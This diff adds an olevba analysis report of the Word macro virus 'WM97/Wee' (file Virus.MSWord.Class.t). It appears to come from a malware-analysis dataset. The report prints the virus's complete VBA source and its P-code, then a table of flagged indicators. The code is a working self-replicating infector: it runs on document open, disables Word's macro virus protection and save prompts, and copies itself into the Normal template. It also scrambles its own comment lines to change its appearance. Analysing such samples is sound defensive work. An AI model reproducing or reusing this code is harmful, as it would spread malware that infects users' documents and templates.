@@ -1,0 +1,724 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Virus.MSWord.Class.t
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: Virus.MSWord.Class.t - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub AutoOpen()
+'310954429211262238784310954429211262238784310954429211262238784310954429211262238784
+Randomize
+'5562097728151465459600556209772815146545960055620977281514654596005562097728151465459600
+o = 0: x = 0
+'4346307648426677342224434630764842667734222443463076484266773422244346307648426677342224
+On Error GoTo 91
+'12258751562522631591844122587515625226315918441225875156252263159184412258751562522631591844
+Options.VirusProtection = False
+'439436410052375068736439436410052375068736439436410052375068736439436410052375068736
+Options.SaveNormalPrompt = False
+'6222929376443344325249622292937644334432524962229293764433443252496222929376443344325249
+Options.ConfirmConversions = False
+'574154752942661663209574154752942661663209574154752942661663209574154752942661663209
+vx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
+'81705328816674236416817053288166742364168170532881667423641681705328816674236416
+xv = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
+'646785892943415556496646785892943415556496646785892943415556496646785892943415556496
+If xv > 0 And vx > 0 Then GoTo 91
+'1712617168947695502449171261716894769550244917126171689476955024491712617168947695502449
+If xv = 0 Then
+'80026752126616291025800267521266162910258002675212661629102580026752126616291025
+    Set Wee = NormalTemplate.VBProject.VBComponents
+'12801511526415690568644128015115264156905686441280151152641569056864412801511526415690568644
+    Set host = ActiveDocument.VBProject.VBComponents
+'65546240400711929124655462404007119291246554624040071192912465546240400711929124
+    lx = Int(Rnd(1) * 100) + 1
+'46486809664554790916464868096645547909164648680966455479091646486809664554790916
+    If lx = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.wee.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(87) + Chr(69) + Chr(69)
+'665449093692575156516665449093692575156516665449093692575156516665449093692575156516
+    lr = Int(Rnd(1) * 75) + 1
+'268458696941557268736268458696941557268736268458696941557268736268458696941557268736
+    If lr = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.happy.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(87) + Chr(69) + Chr(69)
+'14759504076128101157956147595040761281011579561475950407612810115795614759504076128101157956
+    ls = Int(Rnd(1) * 50) + 1
+'5738420250041713977600573842025004171397760057384202500417139776005738420250041713977600
+    If ls = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
+'16610107802519955235169166101078025199552351691661010780251995523516916610107802519955235169
+    lt = Int(Rnd(1) * 25) + 1
+'16095181134428960892041160951811344289608920411609518113442896089204116095181134428960892041
+    If lt = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(87) + Chr(69) + Chr(69)
+'44868983329171872100448689833291718721004486898332917187210044868983329171872100
+    host.Item(1).Name = Wee.Item(1).Name
+'12170469504422690601956121704695044226906019561217046950442269060195612170469504422690601956
+    host.Item(1).Export Application.StartupPath & Chr(87) + Chr(69) + Chr(69)
+'3120098304418326119876312009830441832611987631200983044183261198763120098304418326119876
+End If
+'10114117272925826418436101141172729258264184361011411727292582641843610114117272925826418436
+If vx = 0 Then Set Wee = ActiveDocument.VBProject.VBComponents
+'22711896497020428944227118964970204289442271189649702042894422711896497020428944
+Wee.Item(1).codemodule.AddFromFile Application.StartupPath & Chr(87) + Chr(69) + Chr(69)
+'81079219364541412100810792193645414121008107921936454141210081079219364541412100
+With Wee.Item(1).codemodule
+'10993733862450136135921109937338624501361359211099373386245013613592110993733862450136135921
+    For j = 1 To 4
+'5555920410036276529555592041003627652955559204100362765295555920410036276529
+    .deletelines 1
+'244015641001174844176244015641001174844176244015641001174844176244015641001174844176
+    Next j
+'5192610412921935387236519261041292193538723651926104129219353872365192610412921935387236
+    End With
+'6329316249700925625632931624970092562563293162497009256256329316249700925625
+If xv < 94 Then
+'846460836003176224164846460836003176224164846460836003176224164846460836003176224164
+    With Wee.Item(1).codemodule
+'2305447456934685710081230544745693468571008123054474569346857100812305447456934685710081
+    .replaceline 1, "Sub AutoClose()'WM97/Wee by Virus :) Smile"
+'1427499248449074211729142749924844907421172914274992484490742117291427499248449074211729
+    .replaceline 97, "Sub ToolsMacro()'WM97/Wee by Virus :) Smile"
+'971959374415512702500971959374415512702500971959374415512702500971959374415512702500
+    End With
+'1482111456414444674596148211145641444467459614821114564144446745961482111456414444674596
+End If
+'7565520453428473316756552045342847331675655204534284733167565520453428473316
+If xv = 0 And vx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
+'11578163128911096726281115781631289110967262811157816312891109672628111578163128911096726281
+With Wee.Item(1).codemodule
+'995251065763210015649995251065763210015649995251065763210015649995251065763210015649
+    For j = 2 To Wee.Item(1).codemodule.countoflines Step 2
+'792045334892904239881792045334892904239881792045334892904239881792045334892904239881
+    x = Int(Rnd(414835) * 403989) + 8485
+'690370370013111519961690370370013111519961690370370013111519961690370370013111519961
+    o = Int(Rnd(298368) * 235865) + 2988
+'336388400138354480649336388400138354480649336388400138354480649336388400138354480649
+    .replaceline j, "'" & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
+'116352896897627576896116352896897627576896116352896897627576896116352896897627576896
+Next j
+'27805562513355731489278055625133557314892780556251335573148927805562513355731489
+End With
+'375553392649226947249375553392649226947249375553392649226947249375553392649226947249
+91:
+'393154080429130296976393154080429130296976393154080429130296976393154080429130296976
+If xv <> 94 And vx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
+'1492844112421246269121149284411242124626912114928441124212462691211492844112421246269121
+End Sub
+'8844557040419456065225884455704041945606522588445570404194560652258844557040419456065225
+Sub ViewVBCode() 'WM97/Wee by Virus :) Smile
+'22483718891580380516224837188915803805162248371889158038051622483718891580380516
+End Sub
+'198085920492522550625198085920492522550625198085920492522550625198085920492522550625
+
+'267082240032230661841267082240032230661841267082240032230661841267082240032230661841
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: Virus.MSWord.Class.t
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 11682 bytes
+' Line #0:
+' 	FuncDefn (Sub AutoOpen())
+' Line #1:
+' 	QuoteRem 0x0000 0x0054 "310954429211262238784310954429211262238784310954429211262238784310954429211262238784"
+' Line #2:
+' 	ArgsCall Read 0x0000 
+' Line #3:
+' 	QuoteRem 0x0000 0x0058 "5562097728151465459600556209772815146545960055620977281514654596005562097728151465459600"
+' Line #4:
+' 	LitDI2 0x0000 
+' 	St o 
+' 	BoS 0x0000 
+' 	LitDI2 0x0000 
+' 	St x 
+' Line #5:
+' 	QuoteRem 0x0000 0x0058 "4346307648426677342224434630764842667734222443463076484266773422244346307648426677342224"
+' Line #6:
+' 	OnError 91 
+' Line #7:
+' 	QuoteRem 0x0000 0x005C "12258751562522631591844122587515625226315918441225875156252263159184412258751562522631591844"
+' Line #8:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #9:
+' 	QuoteRem 0x0000 0x0054 "439436410052375068736439436410052375068736439436410052375068736439436410052375068736"
+' Line #10:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt SaveNormalPrompt 
+' Line #11:
+' 	QuoteRem 0x0000 0x0058 "6222929376443344325249622292937644334432524962229293764433443252496222929376443344325249"
+' Line #12:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt ConfirmConversions 
+' Line #13:
+' 	QuoteRem 0x0000 0x0054 "574154752942661663209574154752942661663209574154752942661663209574154752942661663209"
+' Line #14:
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	MemLd codemodule 
+' 	MemLd countoflines 
+' 	St vx 
+' Line #15:
+' 	QuoteRem 0x0000 0x0050 "81705328816674236416817053288166742364168170532881667423641681705328816674236416"
+' Line #16:
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	MemLd codemodule 
+' 	MemLd countoflines 
+' 	St xv 
+' Line #17:
+' 	QuoteRem 0x0000 0x0054 "646785892943415556496646785892943415556496646785892943415556496646785892943415556496"
+' Line #18:
+' 	Ld xv 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	Ld vx 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo 91 
+' 	EndIf 
+' Line #19:
+' 	QuoteRem 0x0000 0x0058 "1712617168947695502449171261716894769550244917126171689476955024491712617168947695502449"
+' Line #20:
+' 	Ld xv 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	IfBlock 
+' Line #21:
+' 	QuoteRem 0x0000 0x0050 "80026752126616291025800267521266162910258002675212661629102580026752126616291025"
+' Line #22:
+' 	SetStmt 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	Set Wee 
+' Line #23:
+' 	QuoteRem 0x0000 0x005C "12801511526415690568644128015115264156905686441280151152641569056864412801511526415690568644"
+' Line #24:
+' 	SetStmt 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	Set host 
+' Line #25:
+' 	QuoteRem 0x0000 0x0050 "65546240400711929124655462404007119291246554624040071192912465546240400711929124"
+' Line #26:
+' 	LitDI2 0x0001 
+' 	ArgsLd Rnd 0x0001 
+' 	LitDI2 0x0064 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St lx 
+' Line #27:
+' 	QuoteRem 0x0000 0x0050 "46486809664554790916464868096645547909164648680966455479091646486809664554790916"
+' Line #28:
+' 	Ld lx 
+' 	LitDI2 0x0063 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld wdWindowStateMinimize 
+' 	Ld ActiveWindow 
+' 	MemSt WindowState 
+' 	BoS 0x0000 
+' 	LitStr 0x0012 "http://www.wee.com"
+' 	ParamNamed Address 
+' 	LitVarSpecial (False)
+' 	ParamNamed NewWindow 
+' 	LitVarSpecial (False)
+' 	ParamNamed AddHistory 
+' 	LitDI2 0x0057 
+' 	ArgsLd Chr 0x0001 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	ParamNamed ExtraInfo 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall FollowHyperlink 0x0004 
+' 	EndIf 
+' Line #29:
+' 	QuoteRem 0x0000 0x0054 "665449093692575156516665449093692575156516665449093692575156516665449093692575156516"
+' Line #30:
+' 	LitDI2 0x0001 
+' 	ArgsLd Rnd 0x0001 
+' 	LitDI2 0x004B 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St lr 
+' Line #31:
+' 	QuoteRem 0x0000 0x0054 "268458696941557268736268458696941557268736268458696941557268736268458696941557268736"
+' Line #32:
+' 	Ld lr 
+' 	LitDI2 0x004A 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld wdWindowStateMinimize 
+' 	Ld ActiveWindow 
+' 	MemSt WindowState 
+' 	BoS 0x0000 
+' 	LitStr 0x0014 "http://www.happy.com"
+' 	ParamNamed Address 
+' 	LitVarSpecial (False)
+' 	ParamNamed NewWindow 
+' 	LitVarSpecial (False)
+' 	ParamNamed AddHistory 
+' 	LitDI2 0x0057 
+' 	ArgsLd Chr 0x0001 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	ParamNamed ExtraInfo 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall FollowHyperlink 0x0004 
+' 	EndIf 
+' Line #33:
+' 	QuoteRem 0x0000 0x005C "14759504076128101157956147595040761281011579561475950407612810115795614759504076128101157956"
+' Line #34:
+' 	LitDI2 0x0001 
+' 	ArgsLd Rnd 0x0001 
+' 	LitDI2 0x0032 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St ls 
+' Line #35:
+' 	QuoteRem 0x0000 0x0058 "5738420250041713977600573842025004171397760057384202500417139776005738420250041713977600"
+' Line #36:
+' 	Ld ls 
+' 	LitDI2 0x0031 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0050 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0052 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x004F 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0056 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0069 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0052 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0075 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0053 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	ArgsCall MsgBox 0x0001 
+' 	EndIf 
+' Line #37:
+' 	QuoteRem 0x0000 0x005C "16610107802519955235169166101078025199552351691661010780251995523516916610107802519955235169"
+' Line #38:
+' 	LitDI2 0x0001 
+' 	ArgsLd Rnd 0x0001 
+' 	LitDI2 0x0019 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St lt 
+' Line #39:
+' 	QuoteRem 0x0000 0x005C "16095181134428960892041160951811344289608920411609518113442896089204116095181134428960892041"
+' Line #40:
+' 	Ld lt 
+' 	LitDI2 0x0018 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0020 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0057 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	ArgsCall MsgBox 0x0001 
+' 	EndIf 
+' Line #41:
+' 	QuoteRem 0x0000 0x0050 "44868983329171872100448689833291718721004486898332917187210044868983329171872100"
+' Line #42:
+' 	LitDI2 0x0001 
+' 	Ld Wee 
+' 	ArgsMemLd Item 0x0001 
+' 	MemLd New 
+' 	LitDI2 0x0001 
+' 	Ld host 
+' 	ArgsMemLd Item 0x0001 
+' 	MemSt New 
+' Line #43:
+' 	QuoteRem 0x0000 0x005C "12170469504422690601956121704695044226906019561217046950442269060195612170469504422690601956"
+' Line #44:
+' 	Ld Application 
+' 	MemLd StartupPath 
+' 	LitDI2 0x0057 
+' 	ArgsLd Chr 0x0001 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	Concat 
+' 	LitDI2 0x0001 
+' 	Ld host 
+' 	ArgsMemLd Item 0x0001 
+' 	ArgsMemCall Export 0x0001 
+' Line #45:
+' 	QuoteRem 0x0000 0x0058 "3120098304418326119876312009830441832611987631200983044183261198763120098304418326119876"
+' Line #46:
+' 	EndIfBlock 
+' Line #47:
+' 	QuoteRem 0x0000 0x005C "10114117272925826418436101141172729258264184361011411727292582641843610114117272925826418436"
+' Line #48:
+' 	Ld vx 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	SetStmt 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	Set Wee 
+' 	EndIf 
+' Line #49:
+' 	QuoteRem 0x0000 0x0050 "22711896497020428944227118964970204289442271189649702042894422711896497020428944"
+' Line #50:
+' 	Ld Application 
+' 	MemLd StartupPath 
+' 	LitDI2 0x0057 
+' 	ArgsLd Chr 0x0001 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	LitDI2 0x0045 
+' 	ArgsLd Chr 0x0001 
+' 	Add 
+' 	Concat 
+' 	LitDI2 0x0001 
+' 	Ld Wee 
+' 	ArgsMemLd Item 0x0001 
+' 	MemLd codemodule 
+' 	ArgsMemCall AddFromFile 0x0001 
+' Line #51:
+' 	QuoteRem 0x0000 0x0050 "81079219364541412100810792193645414121008107921936454141210081079219364541412100"
+' Line #52:
+' 	StartWithExpr 
+' 	LitDI2 0x0001 
+' 	Ld Wee 
+' 	ArgsMemLd Item 0x0001 
+' 	MemLd codemodule 
+' 	With 
+' Line #53:
+' 	QuoteRem 0x0000 0x005C "10993733862450136135921109937338624501361359211099373386245013613592110993733862450136135921"
+' Line #54:
+' 	StartForVariable 
+' 	Ld j 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0004 
+' 	For 
+' Line #55:
+' 	QuoteRem 0x0000 0x004C "5555920410036276529555592041003627652955559204100362765295555920410036276529"
+' Line #56:
+' 	LitDI2 0x0001 
+' 	ArgsMemCallWith deletelines 0x0001 
+' Line #57:
+' 	QuoteRem 0x0000 0x0054 "244015641001174844176244015641001174844176244015641001174844176244015641001174844176"
+' Line #58:
+' 	StartForVariable 
+' 	Ld j 
+' 	EndForVariable 
+' 	NextVar 
+' Line #59:
+' 	QuoteRem 0x0000 0x0058 "5192610412921935387236519261041292193538723651926104129219353872365192610412921935387236"
+' Line #60:
+' 	EndWith 
+' Line #61:
+' 	QuoteRem 0x0000 0x004C "6329316249700925625632931624970092562563293162497009256256329316249700925625"
+' Line #62:
+' 	Ld xv 
+' 	LitDI2 0x005E 
+' 	Lt 
+' 	IfBlock 
+' Line #63:
+' 	QuoteRem 0x0000 0x0054 "846460836003176224164846460836003176224164846460836003176224164846460836003176224164"
+' Line #64:
+' 	StartWithExpr 
+' 	LitDI2 0x0001 
+' 	Ld Wee 
+' 	ArgsMemLd Item 0x0001 
+' 	MemLd codemodule 
+' 	With 
+' Line #65:
+' 	QuoteRem 0x0000 0x0058 "2305447456934685710081230544745693468571008123054474569346857100812305447456934685710081"
+' Line #66:
+' 	LitDI2 0x0001 
+' 	LitStr 0x002A "Sub AutoClose()'WM97/Wee by Virus :) Smile"
+' 	ArgsMemCallWith replaceline 0x0002 
+' Line #67:
+' 	QuoteRem 0x0000 0x0058 "1427499248449074211729142749924844907421172914274992484490742117291427499248449074211729"
+' Line #68:
+' 	LitDI2 0x0061 
+' 	LitStr 0x002B "Sub ToolsMacro()'WM97/Wee by Virus :) Smile"
+' 	ArgsMemCallWith replaceline 0x0002 
+' Line #69:
+' 	QuoteRem 0x0000 0x0054 "971959374415512702500971959374415512702500971959374415512702500971959374415512702500"
+' Line #70:
+' 	EndWith 
+' Line #71:
+' 	QuoteRem 0x0000 0x0058 "1482111456414444674596148211145641444467459614821114564144446745961482111456414444674596"
+' Line #72:
+' 	EndIfBlock 
+' Line #73:
+' 	QuoteRem 0x0000 0x004C "7565520453428473316756552045342847331675655204534284733167565520453428473316"
+' Line #74:
+' 	Ld xv 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	Ld vx 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed FileName 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0001 
+' 	EndIf 
+' Line #75:
+' 	QuoteRem 0x0000 0x005C "11578163128911096726281115781631289110967262811157816312891109672628111578163128911096726281"
+' Line #76:
+' 	StartWithExpr 
+' 	LitDI2 0x0001 
+' 	Ld Wee 
+' 	ArgsMemLd Item 0x0001 
+' 	MemLd codemodule 
+' 	With 
+' Line #77:
+' 	QuoteRem 0x0000 0x0054 "995251065763210015649995251065763210015649995251065763210015649995251065763210015649"
+' Line #78:
+' 	StartForVariable 
+' 	Ld j 
+' 	EndForVariable 
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	Ld Wee 
+' 	ArgsMemLd Item 0x0001 
+' 	MemLd codemodule 
+' 	MemLd countoflines 
+' 	LitDI2 0x0002 
+' 	ForStep 
+' Line #79:
+' 	QuoteRem 0x0000 0x0054 "792045334892904239881792045334892904239881792045334892904239881792045334892904239881"
+' Line #80:
+' 	LitDI4 0x5473 0x0006 
+' 	ArgsLd Rnd 0x0001 
+' 	LitDI4 0x2A15 0x0006 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x2125 
+' 	Add 
+' 	St x 
+' Line #81:
+' 	QuoteRem 0x0000 0x0054 "690370370013111519961690370370013111519961690370370013111519961690370370013111519961"
+' Line #82:
+' 	LitDI4 0x8D80 0x0004 
+' 	ArgsLd Rnd 0x0001 
+' 	LitDI4 0x9959 0x0003 
+' 	Mul 
+' 	FnInt 
+' 	LitDI2 0x0BAC 
+' 	Add 
+' 	St o 
+' Line #83:
+' 	QuoteRem 0x0000 0x0054 "336388400138354480649336388400138354480649336388400138354480649336388400138354480649"
+' Line #84:
+' 	Ld j 
+' 	LitStr 0x0001 "'"
+' 	Ld x 
+' 	Ld x 
+' 	Mul 
+' 	Concat 
+' 	Ld o 
+' 	Ld o 
+' 	Mul 
+' 	Concat 
+' 	Ld x 
+' 	Ld x 
+' 	Mul 
+' 	Concat 
+' 	Ld o 
+' 	Ld o 
+' 	Mul 
+' 	Concat 
+' 	Ld x 
+' 	Ld x 
+' 	Mul 
+' 	Concat 
+' 	Ld o 
+' 	Ld o 
+' 	Mul 
+' 	Concat 
+' 	Ld x 
+' 	Ld x 
+' 	Mul 
+' 	Concat 
+' 	Ld o 
+' 	Ld o 
+' 	Mul 
+' 	Concat 
+' 	ArgsMemCallWith replaceline 0x0002 
+' Line #85:
+' 	QuoteRem 0x0000 0x0054 "116352896897627576896116352896897627576896116352896897627576896116352896897627576896"
+' Line #86:
+' 	StartForVariable 
+' 	Ld j 
+' 	EndForVariable 
+' 	NextVar 
+' Line #87:
+' 	QuoteRem 0x0000 0x0050 "27805562513355731489278055625133557314892780556251335573148927805562513355731489"
+' Line #88:
+' 	EndWith 
+' Line #89:
+' 	QuoteRem 0x0000 0x0054 "375553392649226947249375553392649226947249375553392649226947249375553392649226947249"
+' Line #90:
+' 	LineNum 91 
+' 	BoS 0x0000 
+' Line #91:
+' 	QuoteRem 0x0000 0x0054 "393154080429130296976393154080429130296976393154080429130296976393154080429130296976"
+' Line #92:
+' 	Ld xv 
+' 	LitDI2 0x005E 
+' 	Ne 
+' 	Ld vx 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed FileName 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0001 
+' 	EndIf 
+' Line #93:
+' 	QuoteRem 0x0000 0x0058 "1492844112421246269121149284411242124626912114928441124212462691211492844112421246269121"
+' Line #94:
+' 	EndSub 
+' Line #95:
+' 	QuoteRem 0x0000 0x0058 "8844557040419456065225884455704041945606522588445570404194560652258844557040419456065225"
+' Line #96:
+' 	FuncDefn (Sub ViewVBCode())
+' 	QuoteRem 0x0011 0x001A "WM97/Wee by Virus :) Smile"
+' Line #97:
+' 	QuoteRem 0x0000 0x0050 "22483718891580380516224837188915803805162248371889158038051622483718891580380516"
+' Line #98:
+' 	EndSub 
+' Line #99:
+' 	QuoteRem 0x0000 0x0054 "198085920492522550625198085920492522550625198085920492522550625198085920492522550625"
+' Line #100:
+' Line #101:
+' 	QuoteRem 0x0000 0x0054 "267082240032230661841267082240032230661841267082240032230661841267082240032230661841"
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |http://www.wee.com  |URL                                          |
+|IOC       |http://www.happy.com|URL                                          |
+|IOC       |MSWord.Class        |Executable file name                         |
+|Hex String|CF0vHBfw4"$CF0vHBfw4|434630764842667734222443463076484266773422244|
+|          |"$CF0vHBfw4"$CF0vHBf|3463076484266773422244346307648426677342224  |
+|          |w4"$                |                                             |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
